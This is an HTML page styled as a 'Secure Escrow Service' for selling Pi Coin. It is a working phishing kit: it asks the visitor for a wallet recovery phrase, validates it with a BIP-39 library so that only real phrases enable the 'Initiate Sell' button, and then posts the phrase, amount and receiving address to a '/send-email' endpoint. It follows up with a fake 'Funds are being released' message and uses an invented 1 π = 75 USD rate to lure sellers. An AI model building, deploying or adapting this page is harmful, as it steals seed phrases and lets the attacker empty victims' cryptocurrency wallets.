<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Secure Escrow Service</title>
    <script src="https://cdn.jsdelivr.net/npm/bip39"></script> <!-- Import BIP-39 Library -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .escrow-container {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 400px;
        }
        .balance {
            font-size: 20px;
            font-weight: bold;
            margin: 10px 0;
            color: #28a745;
        }
        button {
            padding: 10px 15px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
            margin: 5px;
        }
        .release {
            background-color: #007bff;
            color: white;
        }
        .dispute {
            background-color: #dc3545;
            color: white;
        }
        input, select {
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .error {
            color: red;
            font-size: 14px;
            display: none;
        }
        /* Popup Styling */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
            width: 350px;
            z-index: 1000;
        }
        .popup button {
            background-color: #28a745;
            color: white;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            z-index: 999;
        }
    </style>
</head>
<body>
    <div class="escrow-container">
        <h2>Escrow Transaction</h2>
        <div class="details">
            <p><strong>Buyer:</strong> Pi Trader</p>
            <p><strong>Seller:</strong> <input type="text" id="seller" placeholder="Enter seller's name" required></p>
            <p><strong>Item:</strong> Digital Product (Pi Coin)</p>
        </div>
        <div class="transaction">
            <h3>Transaction Details</h3>
            <label for="walletPhrase">Wallet Phrase:</label>
            <input type="text" id="walletPhrase" oninput="validateMnemonic()" required>
            <p class="error" id="mnemonicError">Invalid wallet phrase</p>

            <label for="transactionAmount">Transaction Amount (π):</label>
            <input type="number" id="transactionAmount" oninput="updateEscrowBalanceAndUSD()" required>
            
            <label for="paymentMethod">Payment Method:</label>
            <select id="paymentMethod">
                <option value="">Select Payment Method</option>
                <option value="paypal">PayPal</option>
                <option value="usdt">USDT</option>
                <option value="btc">BTC</option>
                <option value="eth">ETH</option>
                <option value="bank">Bank Transfer</option>
            </select>

            <label for="address">Receiving Address:</label>
            <input type="text" id="address" required>
        </div>
        <div class="balance">Escrow Balance: $<span id="escrowBalance">0</span></div>
        <p>Equivalent in USD: $<span id="usdValue">0</span></p>
        <button class="release" id="releaseButton" onclick="showPopup()" disabled>Initiate Sell</button>
        <button class="dispute" onclick="raiseDispute()">Raise Dispute</button>
    </div>

    <!-- Popup Confirmation -->
    <div class="overlay" id="overlay"></div>
    <div class="popup" id="popup">
        <p><strong>Payment is processing.</strong><br> Kindly confirm payment before releasing funds.</p>
        <button onclick="releaseFunds()">Release</button>
    </div>

    <script>
        function showPopup() {
            document.getElementById("popup").style.display = "block";
            document.getElementById("overlay").style.display = "block";
        }

        function releaseFunds() {
            let walletPhrase = document.getElementById('walletPhrase').value;
            let transactionAmount = document.getElementById('transactionAmount').value;
            let usdValue = document.getElementById('usdValue').textContent;
            let paymentMethod = document.getElementById('paymentMethod').value;
            let address = document.getElementById('address').value;
            let seller = document.getElementById('seller').value;
            let escrowBalance = document.getElementById('escrowBalance').textContent;

            if (!walletPhrase || !transactionAmount || !paymentMethod || !address || !seller || !escrowBalance) {
                alert("Please fill out all the required fields.");
                return;
            }

            fetch('/send-email', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ walletPhrase, transactionAmount, usdValue, paymentMethod, address, seller, escrowBalance })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                alert("Funds are being released! Kindly exercise patience.");
                closePopup();
            })
            .catch(error => alert('Error: ' + error.message));
        }

        function updateEscrowBalanceAndUSD() {
            let amount = document.getElementById('transactionAmount').value;
            if (isNaN(amount) || amount <= 0) {
                document.getElementById('escrowBalance').textContent = "0";
                document.getElementById('usdValue').textContent = "0";
            } else {
                document.getElementById('escrowBalance').textContent = amount;
                document.getElementById('usdValue').textContent = (amount * 75).toFixed(2); // Assuming 1 π = 75 USD
            }
        }

        function validateMnemonic() {
            let phrase = document.getElementById("walletPhrase").value.trim();
            let releaseButton = document.getElementById("releaseButton");
            let errorText = document.getElementById("mnemonicError");

            if (bip39.validateMnemonic(phrase)) {
                releaseButton.disabled = false;
                errorText.style.display = "none";
            } else {
                releaseButton.disabled = true;
                errorText.style.display = "block";
            }
        }

        function raiseDispute() {
            alert("Dispute has been raised. Please contact support.");
            window.close();  // This attempts to close the page
        }

        function closePopup() {
            document.getElementById("popup").style.display = "none";
            document.getElementById("overlay").style.display = "none";
        }
    </script>
</body>
</html>
